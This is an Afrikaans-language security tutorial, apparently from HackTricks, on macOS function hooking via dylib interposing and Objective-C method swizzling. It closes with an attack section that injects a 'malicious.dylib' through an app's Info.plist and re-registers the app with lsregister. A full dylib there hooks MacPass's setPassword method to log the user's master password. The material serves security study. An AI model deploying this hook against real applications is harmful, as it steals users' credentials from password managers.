# macOS Funksie Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Funksie Interposering

Skep 'n **dylib** met 'n **`__interpose`** afdeling (of 'n afdeling gemerk met **`S_INTERPOSING`**) wat tupels van **funksie wysers** bevat wat na die **oorspronklike** en die **vervanging** funksies verwys.

Dan, **inspuit** die dylib met **`DYLD_INSERT_LIBRARIES`** (die interposering moet plaasvind voordat die hoof toepassing laai). Dit is duidelik dat die [**beperkings** wat op die gebruik van **`DYLD_INSERT_LIBRARIES`** van toepassing is, hier ook van toepassing is](../macos-proces-abuse/macos-library-injection/index.html#check-restrictions).&#x20;

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
## Metode Swizzling

In ObjectiveC is dit hoe 'n metode genoem word: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Dit is nodig om die **objek**, die **metode** en die **params** te hê. En wanneer 'n metode genoem word, word 'n **msg gestuur** met die funksie **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Die objek is **`someObject`**, die metode is **`@selector(method1p1:p2:)`** en die argumente is **value1**, **value2**.

Volg die objekstrukture, dit is moontlik om 'n **array van metodes** te bereik waar die **name** en **pointers** na die metodekode **geleë** is.

> [!CAUTION]
> Let daarop dat omdat metodes en klasse toeganklik is op grond van hul name, hierdie inligting in die binêre gestoor word, so dit is moontlik om dit te herwin met `otool -ov </path/bin>` of [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Toegang tot die rou metodes

Dit is moontlik om toegang te verkry tot die inligting van die metodes soos naam, aantal params of adres soos in die volgende voorbeeld:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Metode Swizzling met method_exchangeImplementations

Die funksie **`method_exchangeImplementations`** maak dit moontlik om die **adres** van die **implementering** van **een funksie vir die ander** te **verander**.

> [!CAUTION]
> So wanneer 'n funksie aangeroep word, wat **uitgevoer word is die ander een**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> In hierdie geval, as die **implementasiekode van die wettige** metode **verifieer** die **metode** **naam**, kan dit hierdie swizzling **opspoor** en voorkom dat dit loop.
>
> Die volgende tegniek het nie hierdie beperking nie.

### Metode Swizzling met method_setImplementation

Die vorige formaat is vreemd omdat jy die implementasie van 2 metodes een van die ander verander. Deur die funksie **`method_setImplementation`** te gebruik, kan jy die **implementasie** van 'n **metode vir die ander een** **verander**.

Onthou net om die **adres van die implementasie van die oorspronklike een** te **stoor** as jy dit van die nuwe implementasie af gaan aanroep voordat jy dit oorskryf, want later sal dit baie moeiliker wees om daardie adres te lokaliseer.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Aanval Metodologie

In hierdie bladsy is verskillende maniere om funksies te hook te bespreek. Dit het egter behels **om kode binne die proses te loop om aan te val**.

Om dit te doen, is die maklikste tegniek om te gebruik om 'n [Dyld via omgewing veranderlikes of kaping](../macos-dyld-hijacking-and-dyld_insert_libraries.md) in te spuit. Ek vermoed egter dat dit ook gedoen kan word via [Dylib proses inspuiting](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

Albei opsies is egter **beperk** tot **onbeskermde** binêre/prosesse. Kyk na elke tegniek om meer oor die beperkings te leer.

'n Funksie hooking aanval is egter baie spesifiek; 'n aanvaller sal dit doen om **sensitiewe inligting van binne 'n proses te steel** (as nie, sou jy net 'n proses inspuiting aanval doen nie). En hierdie sensitiewe inligting mag geleë wees in gebruiker afgelaaide toepassings soos MacPass.

Die aanvaller se vektor sou wees om of 'n kwesbaarheid te vind of die handtekening van die toepassing te verwyder, en die **`DYLD_INSERT_LIBRARIES`** omgewing veranderlike deur die Info.plist van die toepassing in te spuit deur iets soos:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
en dan **herregistreer** die toepassing:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Voeg in daardie biblioteek die hooking kode by om die inligting te exfiltreer: Wagwoorde, boodskappe...

> [!CAUTION]
> Let daarop dat in nuwer weergawes van macOS, as jy die **handtekening verwyder** van die toepassingsbinêre en dit voorheen uitgevoer is, macOS **nie die toepassing** meer sal uitvoer nie.

#### Biblioteek voorbeeld
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Verwysings

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{{#include ../../../banners/hacktricks-training.md}}
